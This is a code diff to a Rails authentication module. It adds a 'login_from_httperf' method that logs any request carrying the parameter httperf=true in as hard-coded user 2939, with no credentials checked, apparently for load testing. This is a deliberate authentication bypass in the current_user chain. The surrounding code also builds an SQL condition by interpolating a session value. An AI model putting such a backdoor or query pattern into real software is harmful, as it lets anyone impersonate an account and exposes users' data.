@@ -10,7 +10,7 @@ module AuthenticatedSystem
     # Accesses the current user from the session.  Set it to :false if login fails
     # so that future calls do not hit the database.
     def current_user
-      @current_user ||= (login_from_session || login_from_basic_auth || login_from_cookie || login_from_cas || login_from_fb || :false)
+      @current_user ||= (login_from_session || login_from_httperf || login_from_basic_auth || login_from_cookie || login_from_cas || login_from_fb || :false)
     end
     
     # Store the given user in the session.
@@ -103,6 +103,10 @@ module AuthenticatedSystem
     # Called from #current_user.  First attempt to login by the user id stored in the session.
     def login_from_session
       self.current_user = User.find(:first, :conditions => "#{_(:id, :user)} = #{session[:user]}") if session[:user]
+    end
+
+    def login_from_httperf
+      return (self.current_user = User.find(2939)) if params[:httperf] == 'true'
     end
 
     # Called from #current_user.  Now, attempt to login by basic authentication information.
